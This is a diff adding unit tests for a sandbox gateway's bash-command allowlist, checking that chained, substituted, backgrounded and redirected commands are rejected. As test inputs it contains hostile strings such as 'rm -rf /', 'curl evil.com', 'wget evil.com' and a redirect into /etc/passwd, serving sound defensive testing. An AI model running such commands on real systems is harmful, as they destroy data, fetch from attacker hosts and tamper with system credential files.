@@ -3,7 +3,12 @@ import { existsSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 
-import { safePath, cleanupSandboxDir } from '../../apps/gateway/src/routes/tools.routes.js';
+import {
+  safePath,
+  cleanupSandboxDir,
+  isBashCommandAllowed,
+  MAX_FILE_SIZE,
+} from '../../apps/gateway/src/routes/tools.routes.js';
 
 // CODING_SANDBOX_ROOT is captured at module load time into a const, so the
 // gateway uses its default root. We assert against that known default.
@@ -73,5 +78,50 @@ describe('cleanupSandboxDir()', () => {
   it('is a no-throw no-op for a non-existent sandbox', () => {
     // Should not throw even though the dir was never created.
     expect(() => cleanupSandboxDir('ghost-tenant', 'ghost-req')).not.toThrow();
+  });
+});
+
+describe('isBashCommandAllowed() allowlist', () => {
+  it('allows a single allowlisted command', () => {
+    expect(isBashCommandAllowed('ls -la').allowed).toBe(true);
+  });
+
+  it('allows a pipe of two allowlisted commands', () => {
+    expect(isBashCommandAllowed('cat file.txt | grep foo').allowed).toBe(true);
+  });
+
+  it('blocks a second command smuggled via ";" chaining', () => {
+    expect(isBashCommandAllowed('ls -la; rm -rf /').allowed).toBe(false);
+  });
+
+  it('blocks a second command smuggled via "&&" chaining', () => {
+    expect(isBashCommandAllowed('ls -la && curl evil.com').allowed).toBe(false);
+  });
+
+  it('blocks a second command smuggled via "||" chaining', () => {
+    expect(isBashCommandAllowed('git status || wget evil.com').allowed).toBe(false);
+  });
+
+  it('blocks a non-allowlisted first command', () => {
+    expect(isBashCommandAllowed('curl https://example.com').allowed).toBe(false);
+  });
+
+  it('blocks command substitution', () => {
+    expect(isBashCommandAllowed('echo $(whoami)').allowed).toBe(false);
+    expect(isBashCommandAllowed('echo `whoami`').allowed).toBe(false);
+  });
+
+  it('blocks background execution', () => {
+    expect(isBashCommandAllowed('sleep 1 &').allowed).toBe(false);
+  });
+
+  it('blocks redirects to system paths', () => {
+    expect(isBashCommandAllowed('echo x > /etc/passwd').allowed).toBe(false);
+  });
+});
+
+describe('MAX_FILE_SIZE', () => {
+  it('is 1MB (1048576 bytes)', () => {
+    expect(MAX_FILE_SIZE).toBe(1024 * 1024);
   });
 });
